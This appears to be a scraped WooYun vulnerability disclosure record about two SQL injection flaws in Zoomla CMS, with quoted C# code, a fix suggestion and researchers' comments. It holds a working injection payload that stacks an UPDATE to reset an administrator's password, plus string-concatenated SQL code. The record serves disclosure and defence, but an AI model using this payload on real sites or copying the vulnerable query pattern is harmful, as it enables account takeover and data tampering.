{"id": 6053, "wybug_id": "wooyun-2013-041320", "wybug_title": "逐浪CMS通用型SQL注入4+5", "wybug_corp": "逐浪CMS", "wybug_author": "wefgod", "wybug_date": "2013-11-19 02:40", "wybug_open_date": "2014-02-14 02:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-24：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-14：\t细节向公众公开  简要描述： 对于厂商那么自信说“这些漏洞都是老漏洞，之前就修复了”这种给力的态度，决定再提交两个吧，当完结篇，同时为了不浪费大家打开页面的时间，就都放在一个里面提交了！第一个注入点同样是可以直接update的；第二个注入点还是绕过他那坑爹的“防注入”的。 详细说明：  注入点1：http://demo.zoomla.cn/User/Pages/ViewSmallPub.aspx?Pubid=3&ID=1Button3_Click\nprotected void Button3_Click(object sender, EventArgs e)\t{\t\tstring text = base.Request.Form[\"Item\"]; //给text赋值\t\tif (!string.IsNullOrEmpty(text) && this.buser.DelModelInfoAllo(this.HiddenTable.Value, text)) //将参数带入删除模块中\t\t{\t\t\tbase.Response.Write(\"<script language=javascript>alert('批量删除成功!');location.href='ViewPub.aspx?pubid=\" + this.HiddenPubid.Value + \"';</script>\");\t\t\treturn;\t\t}\t\tbase.Response.Write(\"<script language=javascript>alert('批量删除失败!请选择您要删除的数据');location.href='ViewPub.aspx?pubid=\" + this.HiddenPubid.Value + \"';</script>\");\t}\n\nthis.buser.DelModelInfoAllo(this.HiddenTable.Value, text)public bool DelModelInfoAllo(string TableName, string ids){\treturn Sql.Del(TableName, \"ID in (\" + ids + \")\");}\n添加一个回复\n\n\n\nItem= 1); update zl_manager set adminpassword='c4ca4238a0b923820dcc509a6f75849b' where adminname='testuser';--HiddenTable同为可控参数。\n\n   漏洞证明：  注入点2：还是注册页面的啊………………http://zoomla.cn/User/Register.aspx找到对应的DLL，发现里面有检查用户名的函数：\nprivate void CheckUserName();进入该方法\t\tif (this.buser.IsExit(this.TxtUserName.Text))\t\t{\t\t\tfunction.WriteErrMsg(\"<li>该用户名已被他人占用，请输入不同的用户名！</li>\");\t\t}\n继续进入到buser.IsExit\npublic bool IsExit(string userName){\treturn Sql.IsExist(this.strTableName, \"UserName='\" + userName + \"'\");}\n看到这就感觉可能会有SQL注入了，进入Sql.IsExists：\npublic static bool IsExist(string strTableName, string strWhere){\tstring strSql = \"select count(*) from \" + strTableName; //注入\tif (!string.IsNullOrEmpty(strWhere))\t{\t\tstrSql = strSql + \" WHERE \" + strWhere;\t}\treturn SqlHelper.ObjectToInt32(SqlHelper.ExecuteScalar(CommandType.Text, strSql)) > 0;}\n里面防注入的绕过方法看 WooYun: 逐浪CMS通用型SQL注入3 不再多复述了。   修复方案：  过滤、参数化查询   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-02-14 02:40 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-29 11:27 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  一看逐浪 我就想起了wefgod 再回头看看，果然是洞主！关注关注    \n     2013-10-29 11:29 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @梧桐雨 因为数字公司已经不收逐浪了    \n     2013-10-29 11:39 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @Passer_by 没事~我相信洞主不差那点钱 发乌云远比数字更有价值    \n     2013-10-29 12:56 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @梧桐雨 嗯，洞主是伟大的。    \n     2013-10-29 13:27 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  专注哥，果然    \n     2013-10-29 19:09 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  伟大哥    \n     2013-10-30 10:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @梧桐雨 不敢……大牛也去过数字提交啊？    \n     2013-10-30 10:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 @一只猿 不算专注也不伟大！    \n     2013-10-30 10:10 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @wefgod 你妹，你不伟大谁伟大？快点给我换遥控飞机    \n     2013-10-30 14:28 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Passer_by 洗洗睡吧    \n     2013-10-30 14:40 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @梧桐雨 @一只猿 @在路上 @Passer_by    逐浪好像来注册了！ @逐浪CMS  /corp_detail.php?corp=%E9%80%90%E6%B5%AACMS    \n     2013-10-30 15:40 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @wefgod 求忽略    \n     2013-10-30 16:36 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  注入按斤算，任意文件下载，目录浏览，文件删除，还有神马getshell。应有尽有。。    \n     2013-10-30 22:44 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Passer_by 速度    \n     2013-10-30 22:53 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @闪电小子 啊哈，好几个都有的    \n     2013-10-31 21:06 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 求关联到逐浪CMS去。    \n     2013-11-06 16:26 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 狗哥，邮件发过去似乎木有人帮忙关联下啊    \n     2013-11-06 19:37 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n   怎么给0  难道还可以给负的 这绝对是bug    \n     2013-11-18 09:32 |    \t\t士大夫 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:37        | 杭州WEB安全小组)\t\t \n  数字公司是神马？    \n     2013-11-19 09:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗  是不是厂商没收到邮件或者是现在这个状态厂商无法确认了…………    \n     2013-11-19 11:50 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 我给厂商写信了    \n     2013-11-20 10:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 哦这样吗，确认了一个原来忽略的，给了1rank哈哈。目前后面还没看见消息。    \n     2013-11-21 18:38 |    \t\t建建滴忘问 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 码农And红客)\t\t \n  @wefgod 哈哈  厂商之前被我拉进来了    \n     2013-11-22 18:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @建建滴忘问 反正都是忽略。之前他们的拿shell方法太多了。    \n     2013-12-02 15:21 |    \t\t建建滴忘问 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 码农And红客)\t\t \n  @wefgod 唉   说出来都是泪啊……当初怎么就没把他的服务器数据统统打包呢！    \n     2013-12-02 15:47 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @建建滴忘问 万万不可啊 会慢慢跟厂商沟通重视安全     \n     2013-12-03 10:05 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 狗哥，感谢你啊    \n     2013-12-03 19:22 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 吃水不忘挖井人啊，去朋友圈给宣传个？    \n     2013-12-04 09:10 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 哈哈，低调点。朋友圈没有太多可以来乌云混的人……有的话他们都知道的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}